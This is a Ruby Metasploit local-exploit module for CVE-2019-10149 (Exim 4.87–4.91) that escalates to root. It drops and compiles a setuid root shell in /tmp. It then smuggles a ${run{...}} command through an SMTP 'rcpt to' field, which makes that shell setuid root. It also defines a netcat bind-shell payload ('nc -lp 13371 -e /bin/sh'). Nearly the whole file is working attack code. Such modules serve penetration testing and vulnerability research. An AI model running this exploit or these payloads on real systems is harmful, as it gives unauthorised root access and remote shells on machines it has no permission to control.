##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
                      'Name'           => 'Exim 4.87 - 4.91 Privilege Escalation',
                      'Description'    => %q{},
                      'License'        => MSF_LICENSE,
                      'Author'         =>
    [
      'Marco Ivaldi', # Working exploit
      'Guillaume Andre' # Metasploit module
    ],
    'DisclosureDate' => '2019-06-05',
    'Platform'       => [ 'linux' ],
    'Arch'           => [ ARCH_X86, ARCH_X64 ],
    'SessionTypes'   => [ 'shell', 'meterpreter' ],
    'Targets'        =>
    [
      ['Exim 4.87 - 4.91',
       lower_version: Gem::Version.new('4.87'),
       upper_version: Gem::Version.new('4.91')
    ]
    ],
    'References'     =>
    [
      [ 'CVE', '2019-10149' ],
    ]
                     ))
    register_advanced_options [
    ]

    @SUID_SHELL = '/tmp/suid_shell'
    @PAYLOAD_SETUID = '${run{\x2fbin\x2fsh\t-c\t\x22chown\troot\t\x2ftmp\x2fsuid_shell\x3bchmod\t4755\t\x2ftmp\x2fsuid_shell\x22}}@localhost'
    @PAYLOAD_NETCAT = '${run{\x2fbin\x2fsh\t-c\t\x22nc\t-lp\t13371\t-e\t\x2fbin\x2fsh\x22}}@localhost'
  end

  def check
    res = cmd_exec 'exim -bV'
    if (res =~ /Exim version ([0-9\.]*) /i) # Maybe improve the regex
      version = Gem::Version.new($1)
      if (version >= target[:lower_version] && version <= target[:upper_version])
        return CheckCode::Appears
      else
        return CheckCode::Safe
      end
      CheckCode::Unknown
    end
  end

  def inject_payload(payload)
    res = cmd_exec 'exec 3<>/dev/tcp/localhost/25'
    #puts res

    cmd_exec 'read -u 3 && echo $REPLY'
    cmd_exec 'echo "helo localhost" >&3'
    cmd_exec 'read -u 3 && echo $REPLY'
    cmd_exec 'echo "mail from:<>" >&3'
    cmd_exec 'read -u 3 && echo $REPLY'
    cmd_exec "echo 'rcpt to:<#{payload}>' >&3"
    cmd_exec 'read -u 3 && echo $REPLY'
    cmd_exec 'echo "data" >&3'
    cmd_exec 'read -u 3 && echo $REPLY'
    for i in (1..31)
      cmd_exec "echo 'Received: #{i}' >&3"
    end
    cmd_exec 'echo "." >&3'
    cmd_exec 'read -u 3 && echo $REPLY'
    cmd_exec 'echo "quit" >&3'
    cmd_exec 'read -u 3 && echo $REPLY'
  end

  def exploit
    shell_c_code =  %|
          #include <unistd.h>
          #include <sys/types.h>

          int main() {
            setuid(0);
            setgid(0);
            execve("/bin/bash", NULL, NULL);
            return 0;
          }
    |


    write_file("#{@SUID_SHELL}.c", shell_c_code)
    cmd_exec "gcc -o #{@SUID_SHELL} #{@SUID_SHELL}.c 2>&1"
    inject_payload @PAYLOAD_SETUID
    cmd_exec @SUID_SHELL

    if is_root?
      print_status('You are now root, enjoy!')
    else
      print_error('Couldn\'t elevate privileges...')
    end
  end
end
